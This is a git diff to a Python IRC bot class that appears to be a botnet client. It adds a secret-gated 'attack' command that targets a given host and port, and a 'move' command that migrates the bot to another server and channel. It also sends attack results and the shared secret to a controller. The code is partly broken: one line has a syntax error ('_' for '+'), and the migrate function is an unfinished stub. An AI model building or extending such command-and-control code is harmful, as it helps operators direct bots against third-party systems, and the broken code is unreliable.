@@ -167,13 +167,23 @@ class Bot:
             print(msg)
 
             # attack with bot
-            if msg[0] == "attack" and msg[-1] == self.SECRET:
+            if msg[0] == "attack" and msg[-1] == self.SECRET and len(msg) == 3:
                 host = msg[1]
                 port = msg[2]
 
-                print("ATTACK")
+                print("DEBUG: ATTACK")
 
                 self.attack(host, port)
+
+            # move to another server
+            elif msg[0] == "move" and msg[-1] == self.SECRET and len(msg) == 4:
+                host = msg[1]
+                port = msg[2]
+                chan = msg[3]
+
+                print("DEBUG: MOVE")
+
+                self.migrate(host, port, chan)
         
         else:
             print("DEBUG")
@@ -250,7 +260,7 @@ class Bot:
 
             # send to controller
             msg = "PRIVMSG " + self.CONTROLLER
-            msg += " :Attack " + host + " " + port + " successful hello"
+            msg += " :Attack " + host + " " + port + " failed " + self.SECRET
             self.send_msg(msg)
 
             return
@@ -265,14 +275,24 @@ class Bot:
 
         # send to controller
         msg = "PRIVMSG " + self.CONTROLLER
-        msg += " :Attack " + host + " " + port + " successful hello"
+        msg += " :Attack " + host + " " + port + " successful " _ self.SECRET
         self.send_msg(msg)
 
         return
 
 
-    def migrate(self, server):
+    def migrate(self, host, port, chan):
         """ Migrate to a different IRC server """
+        
+        port = int(port)
+
+        try:
+            # connect
+            new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+        except Exception as e:
+            print("Error: " + str(e)) 
 
         return
 
